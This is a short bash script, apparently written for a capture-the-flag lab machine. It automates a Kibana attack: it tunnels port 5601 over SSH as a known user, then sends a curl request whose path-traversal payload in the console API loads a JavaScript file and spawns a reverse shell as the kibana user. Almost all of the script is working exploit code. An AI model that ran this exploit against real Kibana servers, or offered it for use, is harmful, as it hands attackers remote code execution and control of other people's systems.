###################################################################
# Script to automate spawning a reverse shell as the kibana user  #
###################################################################

# Shell needs to be placed on the server with the security user
echo "[!] Please enter the path of the javascript shell: "
read SHELL_PATH
echo "[*] SHELL_PATH: $SHELL_PATH\n"

echo "[!] Exposing the kibana service via SSH"
# -f -N allow the service to wait for the password then sends the process into the background
# "netstat -ltnp" can be used to find running services
ssh -f -N -L 5601:127.0.0.1:5601 security@10.10.10.115

echo "[!] Spawning reverse shell!"
curl "http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../..$SHELL_PATH"